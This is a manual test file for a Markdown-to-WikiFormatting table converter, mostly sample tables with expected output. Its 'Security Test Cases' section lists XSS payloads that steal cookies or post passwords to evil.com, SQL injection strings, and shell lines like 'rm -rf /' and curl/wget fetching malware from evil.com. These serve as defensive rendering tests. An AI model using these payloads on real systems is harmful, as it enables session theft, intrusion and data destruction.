# Tables Testing - Phase 7

**Purpose:** Manual testing file for table conversion. Copy/paste this entire file into the editor (Column 1) to see WikiFormatting conversion in Column 2 and rendered tables in Column 3.

**What to verify:**
- Column 2 shows `||` cell delimiters (not `|`)
- Header rows have `'''Header'''` bold syntax in Column 2
- Separator rows (`|---|---|`) are removed in Column 2
- Column 3 renders proper HTML tables with `<thead>` and `<tbody>`
- Formatting inside cells (bold, italic, links, code) works correctly

---

## Basic Tables

### Simple 2x2 Table

| Header 1 | Header 2 |
|----------|----------|
| Cell 1   | Cell 2   |

Expected Column 2: `|| '''Header 1''' || '''Header 2''' ||` and `|| Cell 1 || Cell 2 ||`

### Single Column Table

| Header |
|--------|
| Row 1  |
| Row 2  |
| Row 3  |

### Wide Table (5 columns)

| A | B | C | D | E |
|---|---|---|---|---|
| 1 | 2 | 3 | 4 | 5 |

---

## Table Alignment

### Left-Aligned

| Column One          | Column Two          |
|:--------------------|:--------------------|
| Left aligned text   | More left text      |
| Short               | Longer content here |
| WordPress           | Development         |

### Center-Aligned

| Column One          | Column Two          |
|:-------------------:|:-------------------:|
| Center aligned text | More centered text  |
| Short               | Longer content here |
| WordPress           | Development         |

### Right-Aligned

| Column One          | Column Two          |
|--------------------:|--------------------:|
| Right aligned text  | More right text     |
| Short               | Longer content here |
| WordPress           | Development         |

### Mixed Alignment

| Left Aligned        | Center Aligned      | Right Aligned       |
|:--------------------|:-------------------:|--------------------:|
| Starts at left      | Centered in column  | Ends at right       |
| WordPress           | Development         | 2024                |
| Plugin Name         | Active Status       | 1,234               |
| Theme Title         | Enabled             | 99.9%               |

**Note:** Alignment syntax (`:---`, `---:`, `:---:`) is converted to WikiFormatting whitespace positioning:
- **Left** (`:---`): Text sticks to left separator with right padding → `||text    ||`
- **Center** (`:---:`): Equal padding on both sides → `||  text  ||`
- **Right** (`---:`): Text sticks to right separator with left padding → `||    text||`
- **No markers** (`---`): Default spacing → `|| text ||`

See Column 2 for WikiFormatting syntax and Column 3 for rendered alignment.

### Alignment Comparison Table (Test All At Once)

Copy this table to see all four alignment types side-by-side:

| No Align | Left Align | Center Align | Right Align |
|----------|:-----------|:------------:|------------:|
| Default  | Left       | Center       | Right       |
| Text     | Sticks     | Padded       | Ends        |
| Normal   | Start      | Both Sides   | Right Side  |

**What to verify in Column 2 (WikiFormatting):**
- Column 1 (No marker `---`): `|| Default ||` - single space both sides
- Column 2 (Left `:---`): `||Left    ||` - text touches left `||`, spaces on right
- Column 3 (Center `:---:`): `||  Center  ||` - equal spaces both sides
- Column 4 (Right `---:`): `||    Right||` - spaces on left, text touches right `||`

**What to verify in Column 3 (Rendered):**
- Column 1: Default left-aligned rendering
- Column 2: Text aligned to left edge of cell
- Column 3: Text centered in cell
- Column 4: Text aligned to right edge of cell

### Single Column Alignment Tests

Test each alignment type individually:

| Left Only |
|:----------|
| Left text |
| L         |

| Center Only |
|:-----------:|
| Center text |
| C           |

| Right Only |
|-----------:|
| Right text |
| R          |

| Default Only |
|--------------|
| Default text |
| D            |

### Large Tables with Clear Alignment (Better Visual Test)

Wide tables make alignment more visible. These examples have longer content to clearly show left/center/right positioning:

#### Product Pricing Table (Mixed Alignment)

| Product Name              | Description                    | Price ($) |
|:--------------------------|:------------------------------:|----------:|
| WordPress Premium         | Full-featured CMS solution     | 299.00    |
| Theme Bundle              | 20 professional themes         | 149.00    |
| Plugin Collection         | Essential WordPress plugins    | 199.00    |
| Support Package           | Priority support for 1 year    | 499.00    |
| Enterprise License        | Unlimited sites                | 999.00    |

**Expected rendering:**
- Column 1 (Product Name): Left-aligned - names start at left edge
- Column 2 (Description): Center-aligned - text centered in wide column
- Column 3 (Price): Right-aligned - numbers aligned to right edge

#### Statistics Dashboard (Number Alignment)

| Metric Name                    | Current Value | Previous Value | Change (%) |
|:-------------------------------|:-------------:|:--------------:|-----------:|
| Total Page Views               | 1,234,567     | 987,654        | +25.0      |
| Unique Visitors                | 456,789       | 398,432        | +14.6      |
| Average Session Duration       | 00:05:32      | 00:04:48       | +15.3      |
| Bounce Rate                    | 42.3%         | 47.8%          | -11.5      |
| Conversion Rate                | 3.45%         | 2.89%          | +19.4      |

**Expected rendering:**
- Column 1 (Metric Name): Left-aligned
- Column 2 & 3 (Values): Center-aligned for easy comparison
- Column 4 (Change): Right-aligned to show + and - symbols clearly

#### Documentation Table (Technical Content)

| Function / Method                          | Return Type      | Description                                  |
|:-------------------------------------------|:----------------:|:---------------------------------------------|
| `wp_enqueue_script($handle, $src)`         | `void`           | Enqueue a JavaScript file for inclusion      |
| `wp_register_style($handle, $src)`         | `bool`           | Register a CSS stylesheet                    |
| `add_action($hook, $callback, $priority)`  | `true`           | Hook a function to a specific action         |
| `apply_filters($tag, $value, ...$args)`    | `mixed`          | Apply filters to a value                     |
| `get_option($option, $default)`            | `mixed`          | Retrieve option value from database          |

**Expected rendering:**
- Column 1 (Function): Left-aligned - function names start at left
- Column 2 (Return Type): Center-aligned - types centered
- Column 3 (Description): Left-aligned - descriptions read naturally

#### Comparison Table (Left vs Right Emphasis)

| Feature                 | Basic Plan                           | Premium Plan                         |
|:-----------------------:|:-------------------------------------|-------------------------------------:|
| **Storage**             | 10 GB total storage space            | Unlimited storage                    |
| **Bandwidth**           | 100 GB per month                     | Unlimited bandwidth                  |
| **Domains**             | 1 domain included                    | Unlimited domains                    |
| **Email Accounts**      | 5 email accounts                     | Unlimited email accounts             |
| **Support**             | Community forum only                 | 24/7 priority support                |
| **SSL Certificate**     | Basic SSL (shared)                   | Advanced SSL (dedicated)             |

**Expected rendering:**
- Column 1 (Feature): Center-aligned - feature names centered
- Column 2 (Basic Plan): Left-aligned - details read from left
- Column 3 (Premium Plan): Right-aligned - emphasizes premium features on right

---

## Formatting Inside Tables

### Bold in Cells

| Name | Status |
|------|--------|
| **Important** | **Critical** |
| Normal | Regular |

Expected Column 2: `|| '''Important''' ||` (text formatting converter applies)

### Italic in Cells

| Type | Example |
|------|---------|
| *Emphasis* | *Important* |
| Plain | Text |

Expected Column 2: `|| ''Emphasis'' ||`

### Bold + Italic

| Style | Demo |
|-------|------|
| ***Both*** | ***Combined*** |

Expected Column 2: `|| '''''Both''''' ||`

### Inline Code in Cells

| Function | Parameters |
|----------|------------|
| `wp_enqueue_script()` | `$handle, $src` |
| `wp_register_style()` | `$handle, $src` |

Expected: Backticks preserved, code protected from formatting conversion

### Links in Cells

| Site | URL |
|------|-----|
| [WordPress](https://wordpress.org) | Official Site |
| [GitHub](https://github.com) | Repository |

Expected Column 2: `|| [https://wordpress.org WordPress] ||`

### Mixed Formatting

| Item | Description | Status |
|------|-------------|--------|
| **Bold** with `code()` | *Italic* text | [Link](https://example.com) |
| ***All*** formatting | Combined `together` | Works! |

---

## Empty and Special Cases

### Empty Cells

| Header 1 | Header 2 | Header 3 |
|----------|----------|----------|
| Data     |          | More     |
|          | Middle   |          |
| Full     | Row      | Here     |

### Cells with Spaces

| ID | Name                | Description        |
|----|---------------------|--------------------|
| 1  | Multiple  spaces    | Should  preserve   |
| 2  | Normal text         | Regular spacing    |

### Special Characters

| Symbol | Name  | Usage |
|--------|-------|-------|
| @      | At    | Email |
| #      | Hash  | Tag   |
| $      | Dollar| Price |
| %      | Percent| Rate |
| &      | Ampersand | And |

### Unicode Characters

| Language | Greeting |
|----------|----------|
| 日本語   | こんにちは |
| 한국어   | 안녕하세요 |
| العربية  | مرحبا |
| עברית    | שלום |

### Emoji in Cells

| Icon | Meaning | Use |
|------|---------|-----|
| 🎉   | Party   | Celebration |
| 🚀   | Rocket  | Launch |
| ✅   | Check   | Complete |
| ❌   | X       | Error |

---

## Multiple Tables in Document

First table with data:

| ID | Name |
|----|------|
| 1  | First |
| 2  | Second |

Some text between tables.

Second table with different data:

| Language | Year |
|----------|------|
| JavaScript | 1995 |
| PHP | 1995 |
| Python | 1991 |

More text after tables.

---

## Tables with Other Elements

### Table After Header

# Section Title

| Feature | Status |
|---------|--------|
| Tables  | ✅ Complete |

### Table Before Code Block

| Step | Command |
|------|---------|
| 1    | Install |
| 2    | Configure |

```bash
npm install
npm start
```

### Table with Blockquote

| Quote | Author |
|-------|--------|
| "Be the change" | Gandhi |

> This is a blockquote after the table

---

## WordPress Examples

### Compatibility Table

| WordPress | PHP | MySQL |
|-----------|-----|-------|
| 6.4 | **7.4+** | 5.7+ |
| 6.3 | *7.4+* | 5.7+ |
| 6.2 | 7.4+ | 5.7+ |

### Component Status Table

| Component | Status | Priority | Assignee |
|-----------|--------|----------|----------|
| Editor | Open | **High** | Team A |
| REST API | Closed | Low | Team B |
| Blocks | In Progress | Medium | Team C |

### Function Reference Table

| Function | Description | Return |
|----------|-------------|--------|
| `wp_enqueue_script()` | Enqueue a script | void |
| `wp_register_script()` | Register a script | bool |
| `add_action()` | Hook a function | true |
| `apply_filters()` | Apply filters | mixed |

### Hook Priority Table

| Hook | Priority | Function |
|------|----------|----------|
| `init` | 10 | `my_init_function()` |
| `wp_enqueue_scripts` | 20 | `enqueue_styles()` |
| `the_content` | 10 | `modify_content()` |

---

## Security Test Cases

**CRITICAL SECURITY VERIFICATION:** These examples contain malicious code that MUST render as safe text in Column 3, never execute.

### XSS: Script Tags in Cells

| Attack Type | Payload |
|-------------|---------|
| Basic Script | <script>alert('XSS')</script> |
| Cookie Theft | <script>document.location='http://evil.com/?c='+document.cookie</script> |
| External Script | <script src="http://evil.com/malicious.js"></script> |

**Expected Column 3:** Script tags appear as escaped text `&lt;script&gt;`, never executed

### XSS: Image Tags with Handlers

| Type | Payload |
|------|---------|
| onerror | <img src=x onerror="alert('XSS')"> |
| Invalid src | <img src="invalid" onerror="window.location='http://evil.com'"> |
| JavaScript URI | <img src="javascript:alert('XSS')"> |

**Expected:** HTML escaped, no images rendered, no JavaScript executed

### XSS: Event Handlers

| Element | Attack |
|---------|--------|
| onclick | <div onclick="alert('XSS')">Click</div> |
| onload | <body onload="alert('XSS')"> |
| onmouseover | <button onmouseover="alert('XSS')">Hover</button> |

**Expected:** Event handlers visible as text, no execution

### XSS: Iframe Injection

| Vector | Code |
|--------|------|
| JavaScript URI | <iframe src="javascript:alert('XSS')"></iframe> |
| Data URI | <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe> |
| External | <iframe src="http://evil.com/phishing"></iframe> |

**Expected:** Iframe tags escaped, nothing embedded

### XSS: SVG Injection

| Variant | Payload |
|---------|---------|
| Script | <svg><script>alert('XSS')</script></svg> |
| onload | <svg onload="alert('XSS')"></svg> |
| animate | <svg><animate onbegin="alert('XSS')"></svg> |

**Expected:** SVG tags escaped, no graphics rendered

### XSS: Object/Embed Tags

| Tag | Attack |
|-----|--------|
| Object | <object data="javascript:alert('XSS')"></object> |
| Embed | <embed src="javascript:alert('XSS')"> |

**Expected:** Tags escaped, no embedded content

### XSS: Form Injection

| Component | Code |
|-----------|------|
| Form | <form action="http://evil.com/steal"><input name="password" type="password"></form> |

**Expected:** Form tags visible as text, no interactive form

### XSS: Meta Redirect

| Type | Payload |
|------|---------|
| HTTP Refresh | <meta http-equiv="refresh" content="0;url=http://evil.com"> |
| JavaScript | <meta http-equiv="refresh" content="0;url=javascript:alert('XSS')"> |

**Expected:** Meta tags escaped, no redirects

### XSS: Data URIs

| Context | Attack |
|---------|--------|
| Link | <a href="data:text/html,<script>alert('XSS')</script>">Click</a> |
| Base64 | <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click</a> |

**Expected:** Links escaped, no data URI execution

### XSS: JavaScript Protocol

| Protocol | URI |
|----------|-----|
| javascript: | [Click](javascript:alert('XSS')) |
| vbscript: | [Click](vbscript:msgbox('XSS')) |
| data: | [Click](data:text/html,<script>alert(1)</script>) |

**Expected:** Malicious URLs blocked (existing link security from Phase 4b applies)

### HTML Entity Injection

| Entity | Code |
|--------|------|
| Less Than | &lt;script&gt; |
| Encoded | &#60;script&#62; |
| Hex | &#x3c;script&#x3e; |

**Expected:** Entities preserved as text

### SQL Injection (showing text protection)

| Type | Payload |
|------|---------|
| Classic | '; DROP TABLE users; -- |
| Tautology | ' OR '1'='1 |
| Comment | admin'-- |

**Expected:** SQL preserved as literal text in cells

### Command Injection

| Command | Payload |
|---------|---------|
| Delete | ; rm -rf / |
| Download | $(curl http://evil.com/malware.sh) |
| Backdoor | \`wget http://evil.com/backdoor\` |

**Expected:** Commands preserved as literal text

### Real-World Attack Vectors

| Vector | Payload |
|--------|---------|
| Polyglot XSS | jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A//</stYle/</titLe/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e |
| Encoded | &#60;script&#62;alert('XSS')&#60;/script&#62; |
| Unicode | <script>alert('XSS')</script> |

**Expected:** All obfuscated attacks rendered safely as text

---

## Edge Cases

### Header-Only Table (No Body Rows)

| Column 1 | Column 2 | Column 3 |
|----------|----------|----------|

Expected: Table with headers only in Column 3

### No-Header Table (All Data Rows)

Note: First row becomes header due to separator line:

| Row 1 Col 1 | Row 1 Col 2 |
|-------------|-------------|
| Row 2 Col 1 | Row 2 Col 2 |

### Table with Varying Cell Widths

| Short | Very Long Header With Many Words That Extends Far |
|-------|---------------------------------------------------|
| A | B |

### Numbers and Percentages

| Year | Growth | Percentage |
|------|--------|------------|
| 2024 | 15.5% | 100% |
| 2025 | 20.3% | 150% |
| 2026 | -5.2% | 75% |

---

## Security Verification Checklist

**After pasting this file into Column 1, verify in Column 3 (Rendered View):**

**Phase 7b Complete:** Column 3 now renders tables as proper HTML `<table>` elements

- [ ] **NO JavaScript executes** (no alert boxes, no console errors)
- [ ] **NO images load** (including broken image icons)
- [ ] **NO iframes/embeds appear**
- [ ] **NO forms are interactive**
- [ ] **NO redirects occur**
- [ ] **NO external resources load** (check Network tab in DevTools)
- [ ] All HTML tags show as escaped text: `&lt;script&gt;`, `&lt;img&gt;`, etc.
- [ ] All event handlers visible as text: `onclick="..."`, `onload="..."`, etc.
- [ ] All malicious URIs show as text or are blocked by existing link security
- [ ] Tables use `<table><thead><tbody>` structure
- [ ] Header cells render as `<th>` elements
- [ ] Body cells render as `<td>` elements
- [ ] React rendering is safe (inspect element shows escaped content)

**How to verify manually:**
1. Open Browser DevTools (F12)
2. Go to Console tab - should be NO errors or alerts
3. Go to Network tab - should be NO external requests
4. Visually inspect Column 3 - should see styled tables, no executed HTML/scripts
5. Inspect element - HTML should show proper table structure with escaped content in cells
6. Check for `<thead>` with `<th>` for headers, `<tbody>` with `<td>` for data

---

## Verification Checklist

**In Column 2 (WikiFormatting), verify:**

- [ ] All cells delimited with `||` (not `|`)
- [ ] Header rows have `'''Header'''` bold syntax
- [ ] Separator rows (`|---|`) removed completely
- [ ] Text formatting converted: `**bold**` → `'''bold'''`, `*italic*` → `''italic''`
- [ ] Links converted: `[text](url)` → `[url text]`
- [ ] Inline code preserved: `` `code` `` → `` `code` ``
- [ ] Empty cells handled correctly
- [ ] Special characters preserved
- [ ] Unicode and emoji preserved
- [ ] Multiple tables each converted independently

**In Column 3 (Rendered Preview), verify:**

- [ ] Tables render with proper HTML structure
- [ ] Headers in `<thead>` with `<th>` elements
- [ ] Body rows in `<tbody>` with `<td>` elements
- [ ] Headers visually distinct (bold, background color)
- [ ] Alternating row colors for readability
- [ ] Borders around cells
- [ ] Text formatting works: bold, italic, links, code
- [ ] Responsive design (table scrolls horizontally if needed)
- [ ] Dark mode support (if enabled)
- [ ] XSS prevention: all malicious content escaped
- [ ] No JavaScript execution
- [ ] No external resources loaded

---

## Browser Testing

Test this file in:
- [ ] Chrome/Chromium
- [ ] Firefox
- [ ] Safari
- [ ] Edge

All browsers should:
- Display tables correctly
- Apply styling properly
- Prevent all XSS attacks
- Show no console errors
- Load no external resources
